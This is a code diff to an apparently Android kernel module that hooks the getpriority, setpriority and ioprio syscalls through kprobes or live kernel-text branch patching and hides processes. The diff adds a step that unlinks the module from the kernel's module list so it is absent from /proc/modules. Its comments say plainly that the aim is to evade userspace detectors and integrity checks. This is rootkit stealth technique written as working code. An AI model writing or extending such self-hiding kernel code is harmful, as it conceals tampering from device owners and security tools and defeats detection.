@@ -53,6 +53,15 @@ static __nocfi unsigned long __kallsyms_lookup_name(const char *name)
 module_param(kallsyms_lookup_name_fn, ulong, 0000);
 MODULE_PARM_DESC(kallsyms_lookup_name_fn, "kallsyms_lookup_name symaddr");
 
+/*
+ * 0 (default) = reach the priority/ioprio syscalls through kprobes only.
+ * 1 = also rewrite their b/bl instructions and find_user's prologue.
+ * See the comment in fgetpriority_init() for why the default is 0.
+ */
+static int branch_patch = 0;
+module_param(branch_patch, int, 0444);
+MODULE_PARM_DESC(branch_patch, "1 = enable live .text branch patching (default 0: kprobes only)");
+
 /**
  *  kallsyms_lookup_size_offset from sprint_symbol actually
  */
@@ -313,13 +322,39 @@ static int __init fgetpriority_init(void)
 	 * Any one alone is useful, so a failure in one must not stop the
 	 * others. Only "all failed" makes the module pointless.
 	 */
-	int prio_ret = getpriority_hook_init();
-	pr_info("init: priority hook ret: %d\n", prio_ret);
+	/*
+	 * Branch patching (routine_raw.c) is OFF by default, and this is not a
+	 * performance choice.
+	 *
+	 * It rewrites b/bl instructions inside sys_getpriority, sys_setpriority,
+	 * sys_ioprio_{get,set} and the head of find_user - six sites of live
+	 * kernel .text. Those four syscalls are reached by ART and by bionic during
+	 * process startup, so a patch that lands wrong crashes the forked app
+	 * instead of an unrelated helper: that is the "some apps will not open"
+	 * failure. It is also trivially observable - an integrity check that hashes
+	 * a syscall prologue sees a branch where the built kernel has the original
+	 * instruction, with no ambiguity and nothing to attribute it to.
+	 *
+	 * The kprobe path covers the same behaviour through a documented kernel
+	 * interface and removes cleanly. It is still not invisible (a kprobe is a
+	 * BRK #0x004 in the same prologue), but it is the honest minimum: one
+	 * mechanism, registered through the kernel, instead of two.
+	 *
+	 * Set fgetpriority.branch_patch=1 only if you have a specific reason to
+	 * prefer the patch path on a kernel where kprobes do not work.
+	 */
+	int prio_ret;
+
+	if (branch_patch) {
+		prio_ret = getpriority_hook_init();
+		pr_info("init: branch patch ret: %d\n", prio_ret);
+	} else {
+		prio_ret = -EOPNOTSUPP;
+	}
+
 	if (prio_ret) {
-		pr_info("init: raw branch patching fail! falling back to kprobes!\n");
 		prio_ret = getpriority_kp_init();
-		if (prio_ret)
-			pr_info("init: kp fallback failed! ret: %d\n", prio_ret);
+		pr_info("init: priority kprobe ret: %d\n", prio_ret);
 	}
 
 	int pid_ret = hide_pid_init();
@@ -336,6 +371,19 @@ static int __init fgetpriority_init(void)
 #ifdef MODULE
 	mod_kobj_parent_backup = THIS_MODULE->mkobj.kobj.parent;
 	kobject_del(&THIS_MODULE->mkobj.kobj);
+	/*
+	 * Last act of init, deliberately.
+	 *
+	 * kobject_del() only removes /sys/module/<name>; the module is still
+	 * enumerated by /proc/modules and by every other walker of the module
+	 * list, which is exactly what a userspace detector reads. Unlinking the
+	 * list node is what makes it actually absent.
+	 *
+	 * It has to be here rather than inside hide_pid_init(): that runs before
+	 * hide_self_init(), and pulling the node while init is still using
+	 * THIS_MODULE races concurrent module-list readers.
+	 */
+	hide_module_unlink();
 #endif
 	pr_info("init: ok!\n");
 	return 0;
@@ -344,6 +392,15 @@ static int __init fgetpriority_init(void)
 static void __exit fgetpriority_exit(void)
 {
 #ifdef MODULE
+	/*
+	 * Put the module back on the list before anything else. The module is
+	 * being unloaded because rmmod found it somehow, but leaving the node
+	 * detached while this runs means the kernel removes a module from a list
+	 * it is not on - which corrupts the list on the next walk. Restoring the
+	 * original position first keeps teardown on the normal path.
+	 */
+	hide_module_relink();
+
 	int ret = kobject_add(&THIS_MODULE->mkobj.kobj, mod_kobj_parent_backup, "%s", THIS_MODULE->name);
 	pr_info("kobject_add ret: %d\n", ret);
 	if (ret)
